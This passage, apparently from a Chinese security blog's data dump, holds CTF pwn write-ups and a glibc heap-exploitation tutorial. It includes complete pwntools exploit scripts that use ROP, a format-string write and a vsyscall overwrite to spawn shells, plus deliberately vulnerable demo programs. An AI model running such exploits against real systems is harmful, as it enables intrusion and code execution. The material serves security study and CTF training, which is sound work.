0LL;\n}\n```\n\n进入leave_message函数，发现v3在rbp-8h的位置，可读入初始长度为16，存在栈溢出；\n但溢出距离太短，只够覆盖rbp，以至于栈迁移都不够。\n可是想一想，a1是可读入长度，若想增加长度必然要改option，而option在内存中的位置很安全，没有函数可以修改到它，且函数限定了option只能为1，2，3，4，并不能改到很大的值，因此这条路是走不通的显然这题只能覆盖rbp，但是把改到哪是一个问题，比赛时我就被卡到这个死胡同了，实在想不通便去做Siri了\n那本题的关键在哪呢？在这\n\n```\nif ( v1 > 256 )\n\tv1 = 256;\nleave_message(v1);\n```\n\n程序在执行leave_message之前，先判断了一次v1的大小(mm+16)，如果大于256，则把它赋值为256\n如果程序有了判断条件，那么一定存在与v1相关的指令，虽然我很不想，但是必须采取终极解决方案了——看汇编\n\n![](https://i.loli.net/2020/08/27/Hah95gr6A8m73tW.png)\n\n所以覆盖rbp，使得rbp-4的值我们可控即可，这就是本题最核心的点。\n改到哪呢，name我们可写，将rbp改到它高4个字节处，使得name>256，接下面就是简单的ROP了\n\n## exp\n\n```python\n#coding:UTF-8\nfrom pwn import *\ncontext.log_level = 'debug'\n#p = remote('123.56.170.202',21342)\nelf = ELF('./babymessage')\np = elf.process()\nlibc = ELF('./libc-2.27.so')\nwork_addr = elf.symbols['main']\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nrdi_ret = 0x400ac3\npayload = 'A'*0x8+ p64(0x6010D4)\np.sendlineafter('choice:','1')\np.sendafter('name:',p32(0xf000050))\np.sendlineafter('choice:','2')\np.sendafter('message:',payload)\n#gdb.attach(p)\np.sendlineafter('choice:','2')\npayload_2 = 'A'*0x8\npayload_2 += p64(0x6010D4)\npayload_2 += p64(rdi_ret)\npayload_2 += p64(puts_got)\npayload_2 += p64(puts_plt)\npayload_2 += p64(work_addr)\np.sendlineafter('message:',payload_2)\nputs_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00'))\nlibc_base = puts_addr- libc.sym['puts']\nlog.info('libc_base:'+hex(libc_base))\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\np.sendlineafter('choice:','1')\np.sendafter('name:',p32(0xf000050))\np.sendlineafter('choice:','2')\np.sendafter('message:',payload)\np.sendlineafter('choice:','2')\npayload = 'A' * 0x10\npayload += p64(libc_base+0x4f365)\np.sendafter('message:',payload)\np.interactive()\n```\n\n可惜啊可惜，感觉这题应该是可以做的\n\n# 0x05 2020 强网杯 Siri\n\n这题考点是格式化字符串漏洞，本以为难点是计算偏移，没想到比赛时我卡在了这样一个奇怪的地方，又没做出来。。原因是数太大了，无法使用fmtstr_payload写地址\n\n![](https://i.loli.net/2020/08/28/Nd3jmAKI8S45pTZ.png)\n\n先看题，打开main函数\n\n```c\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char s1; // [rsp+0h] [rbp-110h]\n  char v5; // [rsp+100h] [rbp-10h]\n  unsigned __int64 v6; // [rsp+108h] [rbp-8h]\n\n  v6 = __readfsqword(0x28u);\n  memset(&s1, 0, 0x100uLL);\n  v5 = 0;\n  sub_11C5();\n  printf(\">>> \", a2);\n  while ( read(0, &s1, 0x100uLL) )\n  {\n    if ( !strncmp(&s1, \"Hey Siri!\", 9uLL) )\n    {\n      puts(\">>> What Can I do for you?\");\n      printf(\">>> \", \"Hey Siri!\");\n      read(0, &s1, 0x100uLL);\n      if ( !(unsigned int)sub_1326(&s1) && !(unsigned int)sub_12E4(&s1) && !(unsigned int)sub_1212(&s1) )\n        puts(\">>> Sorry, I can't understand.\");\n    }\n    memset(&s1, 0, 0x100uLL);\n    printf(\">>> \", 0LL);\n  }\n  return 0LL;\n}\n```\n\n本题保护全开，关键函数在这里\n\n```c\nsigned __int64 __fastcall sub_1212(const char *a1)\n{\n  char *v2; // [rsp+18h] [rbp-128h]\n  char s; // [rsp+20h] [rbp-120h]\n  unsigned __int64 v4; // [rsp+138h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  v2 = strstr(a1, \"Remind me to \");\n  if ( !v2 )\n    return 0LL;\n  memset(&s, 0, 0x110uLL);\n  sprintf(&s, \">>> OK, I'll remind you to %s\", v2 + 13);\n  printf(&s);\n  puts(&::s);\n  return 1LL;\n}\n```\n\n它是将`Remind me to `后的字符放在s[rbp-120h]处，然后一个格式化字符串漏洞，只有这一个利用点\n\n我的思路是泄露libc_start函数和栈的地址，从而泄露出libc基址，然后将返回地址改为one_gadget\n\n## exp\n\n这是我比赛时的exp，由于pwntools的fmt_payload没法用，我又在github上找了一个脚本FmtPayload\n但是还是失败了，我感觉思路应该没问题。。费解，\n网上到现在还没有出强网杯pwn部分的wp，就先放着，等之后出了wp再回头解决\n\n```python\n#coding=utf-8\nfrom pwn import *\nimport FmtPayload\nelf = ELF('./Siri')\nsh = process('./Siri')\n#sh = remote('114.116.54.89',10005)\ncontext.log_level = 'debug'\nlibc = ELF('libc.so.6')\npayload = 'Remind me to %46$pAAAA%83$p'\nsh.recvuntil('>>>')\nsh.sendline('Hey Siri!')\nsh.recvuntil('you?')\nsh.sendline(payload)\nprint payload\nsh.recvuntil(\"to \")\nstack = int(sh.recv(14).split('\\n')[0],16)\nprint 'stack:' + hex(stack)\nsh.recvuntil('AAAA')\nlibc_start240 = int(sh.recv(16).split('\\n')[0],16)\nprint 'libc_start240:' + hex(libc_start240)\nlibc_base = libc_start240 - 240 -libc.sym['__libc_start_main']\nprint 'libc_base:' + hex(libc_base)\none_gadget = libc_base + 0x10a45c\n#gdb.attach(sh)\ntar = stack - 0x118\nprint hex(tar)\nsh.recvuntil('>>>')\nsh.sendline('Hey Siri!')\nsh.recvuntil('you?')\npayload2 = FmtPayload.fmt_payload(10,tar,one_gadget,n=3,written=30,arch='amd64',typex='byte')\n\n#payload2 = fmtstr_payload(10,{stack-0x118:one_gadget})\nsh.sendline('Remind me to '+payload2)\n\nsh.interactive()\n```\n\n后续：题目已解出，exp搞丢了，就不重写了，不放了\n\n------\n\n# 0x06 DASCTF 八月赛 magic_number\n\n一道100分的题没整出来，吐了\n\n```c\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char buf; // [rsp+0h] [rbp-30h]\n  int v5; // [rsp+2Ch] [rbp-4h]\n\n  sub_9A0();\n  v5 = rand();\n  if ( v5 == 0x12345678 )\n    system(\"/bin/sh\");\n  puts(\"Your Input :\");\n  read(0, &buf, 0x100uLL);\n  return 0LL;\n}\n```\n\n就这几行代码，而且还有后门，汇编更简单就不贴了\n但是难点在于除了canary以外，保护全开，这就意味着shellcode不能用，got表不可修改，最要命的是地址随机化。\n\n如果v5==0x12345678，那么执行system，但是随机数是在read之前赋给v5的，且函数只执行一次，实在想不出办法。\n\n终于大佬赛后发了exp，我才学到了一个新的技巧来绕过PIE——利用vsyscall\n\n在多次运行程序时你会发现，当所有地址都在随机变化时，最下面有个vsyscall段的地址一直稳定在`0xffffffffff600000-0xffffffffff601000`，那它到底是什么呢？\n\n对于某些系统调用，如gettimeofday来说，由于他们经常被调用，但是系统调用是用户态到内核态到用户态的一个过程，开销很大，如果每次被调用都要这么来回折腾一遍，就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.\n\n动态调试，发现system('/bin/sh')的地址在这里\n\n![image-20200826003915368](https://i.loli.net/2020/08/26/bMVAd1lmrTgSs7O.png)\n\n而在这里，你会发现一个很接近的地址，只是最低字节不相同，因此可以通过vsyscall滑动绕过，覆盖这里地址，以劫持到ip。\n\n![image-20200826004057378](https://i.loli.net/2020/08/26/JYSMiNmga8cCzTs.png)\n\n------\n\n## exp\n\n```python\n#!/usr/bin/python\n#coding:utf-8\nfrom pwn import *\ncontext.log_level = 'debug'\np=process('magic_number')\n#p=remote('183.129.189.60',10010)\nelf=ELF('magic_number')\nsleep(5)\npayload = 'B'*0x38+p64(0xFFFFFFFFFF600400)*4+'\\xA8'\n#gdb.attach(p)\np.send(payload)\n#pause()\np.interactive()\n```\n\n计算机什么边角都能利用啊，学习了学习了\n\n***Reference：***\n\n[pwn中vsyscall的利用](http://blog.eonew.cn/archives/968)\n\n[x86 架构下 Linux 的系统调用与 vsyscall, vDSO](https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/)\n\n------\n\n# 0x07 小结\n\n总结一下，我好菜\n\n这都是我比赛没想出来的题目，做出来的题目也都比较水，各位师傅都有wp，我就不写了\n","tags":["CTF","wp"],"categories":["PWN"]},{"title":"堆溢出漏洞利用总结","url":"/2020/08/06/Heap/","content":"\n# 0x00 前言\n\n历时三天的速成，终于把报告上交了；\n\n不过话说回来，堆可能是初学者比较难啃的骨头，没什么固定做法，复杂多变；\n\n这里自己记录一些最基本的知识点\n\n------\n\n后期往里补充一点知识点\n\n# 0x01 背景知识\n\n堆(heap)是一种全局的数据结构，主要是指用户动态申请的内存(如调用malloc、alloc、new等函数)，不同于栈的是，堆具有更多的灵活性，因此堆漏洞的利用也更加复杂，更加零散，在此我总结一下堆溢出漏洞的几种常见的利用方法。\n\n以下是学习堆所需要掌握并熟悉的基本知识点。\n\n1. glibc malloc中三种最基本的堆块数据结构：heap_info, malloc_state, malloc_chunk;\n\n2. chunk内存块结构及各字段功能;\n\n3. bins类型及空闲内存块的管理组织方法;\n\n4. malloc()、free()工作流程；\n\n# 0x02 基本漏洞类型\n\n### 1.常规堆溢出\n\n堆缓冲区溢出与栈缓冲区溢出类似，指堆上的缓冲区被填入过多数据，导致堆中其他数据被覆盖，主要分为两种情况：\n\n(1)覆盖本堆块内部数据，通常发生在结构体中，如果结构体中数组溢出，则覆盖后续变量。\n\n(2)覆盖后续堆块数据，会影响后续堆块的数据，甚至破坏堆块结构。\n\n对于这两种情况可以类比栈溢出原理，没有太多技巧性的知识，但是CTF中不会出现单纯利用堆溢出的题目，通常多种基本漏洞会相互结合，所以要求常见基本漏洞类型都要掌握并且能够灵活使用。\n\n------\n\n\n\n### 2.Off By One\n\n缓冲区溢出的一种，但是比较特殊，只能溢出1个字节。\n\n有两种利用思路：\n\n(1)  溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。\n\n(2)  溢出字节为 NULL 字节：溢出的一个字节恰好覆盖下一堆块的size域的最低位，将PREV_INUSE位置0，这样前块会被认为是 free 块。这时可以选择使用 unlink 方法进行处理(后面将详细介绍)，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。\n\n下面是一个简单的off by one的程序：\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main(void)\n{\n    char buffer[40]=\"\";\n    void *chunk1;\n    chunk1=malloc(24);\n    puts(\"Get Input\");\n    gets(buffer);\n    if(strlen(buffer)==24)\n    {\n        strcpy(chunk1,buffer);\n    }\n    return 0;\n}\n```\n\n程序很简单，但并非安全，问题在于strlen 在计算长度的时候不会把结束符 '\\x00' 计算在内，但strcpy 在拷贝的时候会把 '\\x00' 也算上，所以就会造成 off by one。(for循环中也比较常见)\n\n调试一下，便于理解，在main函数下断点，然后单步到输入位置，查看一下chunk情况，\n\n![](https://i.loli.net/2020/07/23/1EsYTkOrwICQqng.png)\n\n当我们输入24个’A’之后，很明显下一位低字节被覆盖为’\\x00’\n\n![](https://i.loli.net/2020/07/23/qaxSFDMzu9iPpkT.png)\n\nNote：有一个点要注意，为什么申请了24个字节，chunk大小是0x21呢，也就是说为什么用户数据部分大小只有0x10?\n\n其实是这样的，当前一堆块正在使用时，下一堆块的prev_size也被当作数据部分(大小0x08)，只有前一堆块free时，prev_size域才有意义。\n\n------\n\n### 3.Use After Free\n\nUse After Free(UAF)即释放后使用漏洞。若堆指针在释放后未置空，形成悬挂指针，当下次访问该指针时，依然能够访问原指针所指向的堆内容，形成漏洞。通常需要根据具体情况分析，以判断是否具有信息泄露和信息修改的功能。\n\n这是比赛时最常规的一种方法，绝大多数题目都要借助它来完成，简单来说当我们第一次申请的内存释放之后，没有进行内存回收，下次申请的时候还能申请到这一块内存，导致我们可以用以前的内存指针来访问修改过的内存。\n\n同样，用一个 UAF的程序展示简单的漏洞利用，以便于理解。\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\ntypedef void (*func_ptr)(char *);\nvoid sys1(char command[])\n{\nsystem(command);\n}\nvoid echo(char content[])\n{\nprintf(\"%s\",content);\n}\nint main()\n{\n    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));//申请了4个int大小的内存\n    printf(\"malloc addr: %p\\n\",p1);//因为前2个也就是0x10是用来管理chunk的\n    p1[2]=echo;//所以从第三个开始\n    p1[2](\"hello world\\n\");\n    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针\n    p1[2](\"hello again\\n\"); //p1指针未被置空,虽然free了,但仍可使用.\n    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));\n    //free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来\n    printf(\"malloc addr: %p\\n\",p2);\n    printf(\"malloc addr: %p\\n\",p1);//p2与p1指针指向的内存为同一地址\n    p2[2]=sys1; //在这里将p1指针里面保存的echo函数指针覆盖成为了sys1指针.\n    p1[2](\"/bin/sh\");\n    return 0;\n}\n```\n\n很明显，p1,p2指针指向了同一地址，原因就是p1被释放后，放入fastbin，当p2再次申请同样大小的空间时，直接从fastbin中取出刚刚被释放、且大小合适的内存空间（即p1），以提高分配速度，如果程序员粗心大意，那么就会造成了可以被利用的UAF漏洞。\n\n![](https://i.loli.net/2020/07/23/9iB4mYRT1dDb7tA.png)\n\n成功获取shell。\n\n------\n\n### 4.Double Free\n\nDouble Free是UAF较为特殊的一种，也是比赛中经常被使用的基本方法之一，简单的说，double free是任意地址写的一种技巧，要与堆管理的其他特性相结合使用，先不谈利用，这里我只是介绍一下double free最基础的原理。以fastbin为例，fastbin 是 LIFO 的数据结构，使用单向链表实现。根据fastbin 的特性，释放的chunk 会以单向链表的形式回收到fastbin 里面，然后通过 fastbin->fd 来遍历。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以这里在两次 free 之间，增加了一次对其他 chunk 的 free 过程，从而绕过了检查顺利执行，然后再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main() {\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *a = malloc(9);\n    char *b = malloc(9);\n    char *c = malloc(9);\n    strcpy(a, \"AAAAAAAA\");\n    strcpy(b, \"BBBBBBBB\");\n    strcpy(c, \"CCCCCCCC\");\n    fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a);\n    fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b);\n    fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c);\n\n    fprintf(stderr, \"Freeing the first one %p.\\n\", a);\n    free(a);\n    fprintf(stderr, \"Then freeing another one %p.\\n\", b);\n    free(b);\n    fprintf(stderr, \"Freeing the first one %p again.\\n\", a);\n    free(a);\n\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *d = malloc(9);\n    char *e = malloc(9);\n    char *f = malloc(9);\n    strcpy(d, \"DDDDDDDD\");\n    fprintf(stderr, \"4st malloc(9) %p points to %s the first time\\n\", d, d);\n    strcpy(e, \"EEEEEEEE\");\n    fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e);\n    strcpy(f, \"FFFFFFFF\");\n    fprintf(stderr, \"6rd malloc(9) %p points to %s the second time\\n\", f, f);\n}\n```\n\n程序free(a)了两次，可以一步一步调试chunk的情况，\n\n三次malloc之后\n\n![](https://i.loli.net/2020/07/23/M9V4kXQqRULDdnA.png)\n\nfree(a)之后，可以看到a被加到了fastbin中\n\n![](https://i.loli.net/2020/07/23/7InVkBHpStOg4Nz.png)\n\n![](https://i.loli.net/2020/07/23/EYlCgqmK4Qud8FX.png)\n\nfree(b)之后,可以看到b也被加到fastbin中，并且fd指针指向了a的地址\n\n![](https://i.loli.net/2020/07/23/XMowxTDZ7PsiAq3.png)\n\n![](https://i.loli.net/2020/07/23/P6e2dSHTAkmLpvX.png)\n\n再次free(a)之后，a->fd又指向了b，也就是说a再一次被添加到fastbin，同时b->fd=a，所以实际上形成了一个环。\n\n![](https://i.loli.net/2020/07/23/gErzHZUPC8Kt5nY.png)\n\n最后三次malloc之后,发现0x44(‘D’)不见了，其实是第二次malloc a的时候0x46将其覆盖了。这就是double free的基本原理，但可以想象，如果第一次申请a的时候，将fd指针修改成有意义的地址，那么我们就可以做到任意地址写(可以结合堆溢出)。\n\n![](https://i.loli.net/2020/07/23/PIeNXDMBSHuAEaw.png)\n\n在 libc-2.26 之后，即使两次 free，也没有触发 double-free 的异常检测，这是因为 tcache 的机制有关，水平有限，这里暂不探讨。\n\n------\n\n# 0x03 堆溢出漏洞利用\n\n### 1. House of spirit(fastbin)\n\n**利用技术:**\n\n> (1) fastbin 为单链表(只用到fd)，结构简单，容易伪造\n>(2) 为了提高分配效率，安全检查少\n> (3) 只针对fastbin大小的chunk，small/large chunk不适用\n>(4) 存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞\n\n**利用思路:**\n\n1. 空闲fast chunk如果发生溢出被覆盖，则链表指针fd可以被修改\n\n2. 通过修改链表指针fd，在fastbin中引入伪造的free chunk(最重要的是必须保证伪造的chunk结构合法)\n\n3. 下次分配时分配伪造的fast chunk\n\n4. 伪造的fast chunk可以在以下位置：\n\n在栈上伪造fast chunk：覆盖返回地址\n在bss上伪造fast chunk：修改全局变量\n在堆上伪造fast chunk：修改堆上数据\n\n以fastbin_dup_into_stack为例，该程序便是利用double free进行fastbin attack其余两种可类比该例子\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main() {\n    unsigned long long stack_var = 0x21;\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *a = malloc(9);\n    char *b = malloc(9);\n    char *c = malloc(9);\n    strcpy(a, \"AAAAAAAA\");\n    strcpy(b, \"BBBBBBBB\");\n    strcpy(c, \"CCCCCCCC\");\n    fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a);\n    fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b);\n    fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c);\n\n    fprintf(stderr, \"Freeing the first one %p.\\n\", a);\n    free(a);\n    fprintf(stderr, \"Then freeing another one %p.\\n\", b);\n    free(b);\n    fprintf(stderr, \"Freeing the first one %p again.\\n\", a);\n    free(a);\n\n    fprintf(stderr, \"Allocating 4 buffers.\\n\");\n    unsigned long long *d = malloc(9);\n    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));\n    fprintf(stderr, \"4nd malloc(9) %p points to %p\\n\", d, &d);\n    char *e = malloc(9);\n    strcpy(e, \"EEEEEEEE\");\n    fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e);\n    char *f = malloc(9);\n    strcpy(f, \"FFFFFFFF\");\n    fprintf(stderr, \"6rd malloc(9) %p points to %s\\n\", f, f);\n    char *g = malloc(9);\n    strcpy(g, \"GGGGGGGG\");\n    fprintf(stderr, \"7th malloc(9) %p points to %s\\n\", g, g);\n}\n```\n\n这个程序展示了怎样通过修改指针，将其指向一个伪造的 free chunk，在伪造的地址处 malloc 出一个 chunk。Double free之前的程序基本没变，关键点在于我们的下一次malloc：\n\n```c\nunsigned long long *d = malloc(9);\n*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));\n```\n\n填充了一个地址：栈地址-0x8\n\n  这一步的意义就是在于在栈上构造了一个合法chunk，伪造的chunk要有合法的堆头信息，所以应从size域-0x8开始。\n\n特别要注意的是，fake fastbin中的size需要与改写指针的fastbin块大小一致，且p位为1。\n\n可以看一下栈中的位置\n\n![1590283439038-3681fb04-725f-4a4e-ae8a-cd6f17aa0b82](https://s2.loli.net/2022/01/27/1KCrU8tOBzqPJVy.png)\n\n而在fastbin中，原本的a堆块fd指针已经改为栈中对应的地址，因此当下一次malloc a时，就会在我们伪造的假chunk分配内存。\n\n![1590284609774-10ac80a9-eab4-4ed0-8cd5-86cd1adab978](https://s2.loli.net/2022/01/27/OSb7euGK2EHxFor.png)\n\n如果能实现在栈中的任意地址写，那么就可以用栈的方法获取shell。\n\n同样，如果存在堆溢出漏洞，也可以进行free chunk fd指针的修改，但是为了总结相关原理和便于理解，我举的例子都很简单，仅适合入门者学习参考。\n\n------\n\n### 2. house of force\n\n**利用条件：**\n\n1.能够以溢出的方式控制到top chunk的size域\n\n2.能够自由地控制堆分配尺寸的大小\n\n3.可以构造size拿到top chunk本身之外的内存，如libc的内存空间\n\n这种方法主要是指堆块溢出覆盖top chunk中的size域的情况，通过将其修改为一个非常大的数据，从而可以申请非常大的空间，使得新top chunk的头部落到想要修改的位置。在下次申请时，就能够得到目标内存，从而实现泄露和改写。\n\n**利用步骤如下：**\n\n(1)首先先泄露出堆地址。\n\n(2)利用堆溢出，将top chunk的size域修改为很大的数\n\n(3)申请大块内存(可以通过堆地址和目标地址的距离进行计算)，使得top chunk的头部落在目标地址范围内。\n\n(4)再次申请内存，那么新申请的内存即为目标地址，通常情况下(未开启FullRelro)，一般是将目标地址设为got表地址。\n\n![](https://i.loli.net/2020/07/23/URVaO8tr3z6buBf.png)\n\n当我们计算好当前堆块与目标地址之间的偏移后，申请该大小的堆块，让chunk头会恰好落在目标地址前(低地址)，这时再次申请，我们就可以改写目标地址内容。\n\n------\n\n### 3.unlink(旧版)\n\nunlink攻击技术是利用glibc malloc的内存回收机制，通过堆溢出等方法进行内存修改。\n\n要想利用unlink，首先要了解free()的工作过程：\n\n> (1)如果size<max fast，放入fastbin，结束\n>(2)如果前一个chunk是free的，unlink前面的chunk，合并两个chunk，并放入unsorted bin\n> (3)如果后一个chunk是free的，则unlink后面的chunk，合并两个chunk，并放入unsorted bin\n>(4)如果后一个是top chunk，则将当前chunk并入top chunk\n> (5)前后chunk都不是free的，则直接放入unsorted bin\n\n相关代码如下:\n\n![image-20200723164353967](https://i.loli.net/2020/07/23/JgR9imeK6YMQ2rZ.png)\n\n流程大体是这样的：\n\n(1)将前一个chunk占用的内存合并到当前chunk;\n(2)修改指向当前chunk的指针，改为指向前一个chunk。\n(3)使用unlink宏，将前一个free chunk从双向循环链表中移除\n\n向前合并和向后合并过程类似，这里不再赘述。了解了unlink的基本原理之后，可以结合例子理解\n\n存在unlink攻击漏洞的程序如下\n\n```c\n#include <stdlib.h>\n#include <string.h> \n\nint main( int argc, char * argv[] )\n{\nchar * first, * second; \n\nfirst = malloc( 666 );\nsecond = malloc( 12 );\n  if(argc!=1)\n     strcpy( first, argv[1] );\n\nfree( first );\nfree( second );\nreturn( 0 );\n}\n```\n\n该程序存在一个堆溢出漏洞：如果用户输入的argv1的大小比first变量的666字节更大的话，那么输入的数据就有可能覆盖掉下一个chunk的chunk header——这可以导致任意代码执行。而攻击的核心思路就是利用glibc malloc的unlink机制。\n\n现在我们再来分析如果一个攻击者精心构造输入数据并通过strcpy覆盖了second chunk的chunk header后会发生什么情况。 \n\n假设被覆盖后的chunk header相关数据如下： \n\n \n\n> (1) 填充prev_size位为一个偶数\n>\n> (2) size = -4 (64位下为-8) \n>\n> (3) fd = free 函数的got表地址address – 12； \n>\n> (4) bk = shellcode的地址 \n\n那么当程序调用free(first)后会发生什么呢？\n\n我们一步一步分析，前面已经介绍过了free的流程，由于first前面无free的chunk，所以不会发生向后合并，因此来判断下面是向前合并，代码如下：\n\n![image-20200723164646772](https://i.loli.net/2020/07/23/kh4bnoClPHOEZRT.png)\n\n本例中，next chunk就是second chunk，从上面代码可知chunk判断下一堆块是否free的方法，即通过nextchunk + nextsize计算得到指向下下一个chunk的指针，然后判断下下个chunk的size的PREV_INUSE标记位是否为0。\n\n在本例中，此时nextsize被我们设置为了-4，这样glibc malloc就会将next chunk的prev_size字段看做是next-next chunk的size字段，而我们已经将next chunk的prev_size字段设置为了一个偶数，因此此时通过inuse_bit_at_offset宏获取到的nextinuse为0，即next chunk为free！\n\n既然next chunk为free，那么就需要进行向前合并，所以就会调用unlink(nextchunk, bck, fwd)函数。\n\n真正的重点就是这个unlink函数的利用，认真分析一下unlink的代码\n\n![](https://i.loli.net/2020/07/23/EHrP51xWJX7fKR2.png)\n\n打眼一看，很像数据结构中学过的删除链表中某一结点的操作，确实如此，unlink实现的功能正是在bins链表中删除掉已经被合并的块。\n\n具体利用流程如下：\n\n> (1) 首先FD = nextchunk->fd = free地址 – 12; \n>(2) 然后BK = nextchunk->bk = shellcode起始地址；\n> (3) 再将BK赋值给FD->bk，即（free地址 – 12）->bk = shellcode起始地址； \n>(4) 最后将FD赋值给BK->fd，即(shellcode起始地址)->fd = free地址 – 12。\n\n作图理解一下：\n\n![image-20200723165236574](https://i.loli.net/2020/07/23/BTQOKLG2XSyHqge.png)\n\n结合图片应该很好理解，借助了unlink将free()的got表修改为shellcode地址，当再次free(second)时，就会转而运行我们写好的shellcode了。\n\n这里的chunk头并不是真实的，只是我们在攻击中需要让glic malloc在进行unlink时将它们强制看作chunk结构体而伪造的，也就是我上面说的结构合法。\n\n------\n\n### 4.unlink (freenote)\n\n上面Unlink的方法有些过时，但是可以拿过来学习一下原理，有助于对堆有更好的理解，目前新式的unlink中加入了许多限制，其中最重要的一条是：\n\n`FD->bk !=p || BK->fd !=p; `\n\n也就是说由于有一个保护检查机制，它会检查这个 chunk 的前一个 chunk 的 bk 指针是不是指向这个 chunk（后一个也一样），直接导致很多利用方式难以满足这个条件，比较有效的是freenote的方式。\n\n下面介绍freenote的主要利用思路。\n\nFree chunk 的双链表结构如下所示：\n\n`FD = p->fd = *(&p + 2)`\n`BK = p->bk = *(&p + 3)`\n\n但现在执行unlink(P,BK,FD)时，需要满足FD->bk = p && BK->fd = p的条件，即：\n\n`FD->bk = *(*(&p + 2) + 3 ) = *(p[2] + 3) == p `\n `BK->fd = *(*(&p + 3) + 2 ) = *(p[3] + 2) == p `\n=>\n`p[2] = &p – 3, p[3] = &p – 2 `\n\n这里比较绕，建议画图辅助理解。\n\n这时如果存在一个全局变量G_P，其中存储的指针指向p的话，那么就可以通过设置p[2] = &p – 3, p[3] = &p – 2 进行伪造，来满足指针检查。\n\n![](https://i.loli.net/2020/07/23/vLMebO9hn6pTHP4.png)\n\n根据图所示，当构造的fake chunk溢出修改了下一个chunk的 prev_size和p位，就可以将fake chunk 伪造成free chunk，这时free掉下一个chunk，两个块便可合并，触发unlink。\n\n> FD = P->fd \n>BK = P->bk \n> FD->bk = BK\n>BK->fd = FD\n\n![1593172846524-c2fc14af-bf0c-44db-8c3d-d2b26e5ea2c5](https://s2.loli.net/2022/01/27/DhwBNx1VLH9i3FZ.png)\n\n最终执行:\n\n> FD->bk = BK; =>p = *(&p+3) = p[3] = &p-2\n>BK->fd = FD; =>p = *(&p+2) = p[2] = &p-3\n\n使得：\n`p= &p – 3`\n\n最后，p指针指向全局变量G_P前面3个4(8字节)字节处。如果G_P是个管理结构，那么就可以实现任意地址读写了。即可以通过修改p所指向的内容来修改p的指针了\n\n需要满足如下条件：\n\n1. 存在堆覆盖，可以改写到即将要释放的堆块，将其prev_size改成所构造的堆块大小，size中p位改为0.\n2. 存在已知地址的指针(通常为全局变量)指向伪造的堆块头部。\n\n3. 能够释放后续堆块来触发unlink。\n\n------\n\n### 5.forgotten chunk\n\nforgotten chunk主要是指chunk的申请释放中被遗忘的部分，虽然堆块的申请和释放逻辑相对来说比较完善，但是检查还是存在漏洞。\n\n简单的情况是从前往后释放，构造出残留堆块。\n\n![image-20200723165755808](https://i.loli.net/2020/07/23/RlSDu1gY6TMqkoh.png)\n\n如图所示，如果存在缓冲区溢出，然后通过正常申请释放构造出重叠堆块。\n\n对于已经使用的A,B,C三个堆块，在大小方面没有要求，其中如果A存在堆溢出，且能够覆盖到堆块B的size域(或存在其他改写方式也能达到相同目的)，将堆块B的size域的部分改写成size(B)+size(C)的值(NMP位保持不变)，然后对堆块B进行释放，这样是可以通过检查的，并且能将B,C识别成一个堆块进行处理。其中原本C后续堆块的prev_size域会被当成数据部分处理，不起标识作用，使检查能顺利通过。\n\n在此基础上，可以结合最基本的堆利用方法、unlink、fastbin来对堆块进行利用。\n(1) 如果C块或者其上还有其他未知块部分存在变量指针，则采用最基本堆利用方法，直接构造指针数据即可。\n(2) 如果存在fastbin中的堆块，且其中想改写的目的地址符合fastbin利用条件，则采用fastbin的方法。\n(3) 直接申请新堆块，在其中构造unlink利用的条件，通过释放堆块来触发unlink。\n\n具体利用什么方法视情况而定。\n\n### 7. tcache利用\n\n2.27的libc不再多说，基本没有任何检查，可以直接构造double free。\n\n在libc-2.29，tcache添加了新的检测机制，相关的源码如下\n\n```c\n//glibc-2.27\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n} tcache_entry;\n\n//glibc-2.29\ntypedef struct tcache_entry\n{\n  struct tcache_entry *next;\n  /* This field exists to detect double frees.  */\n  struct tcache_perthread_struct *key;\n} tcache_entry;\n```\n\n```c\n//glibc-2.27\ntcache_put (mchunkptr chunk, size_t tc_idx)\n{\n  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);\n  assert (tc_idx < TCACHE_MAX_BINS);\n  e->next = tcache->entries[tc_idx];\n  tcache->entries[tc_idx] = e;\n  ++(tcache->counts[tc_idx]);\n}\n\ntcache_get (size_t tc_idx)\n{\n  tcache_entry *e = tcache->entries[tc_idx];\n  assert (tc_idx < TCACHE_MAX_BINS);\n  assert (tcache->entries[tc_idx] > 0);\n  tcache->entries[tc_idx] = e->next;\n  --(tcache->counts[tc_idx]);\n  return (void *) e;\n}\n\n//glibc-2.29\ntcache_put 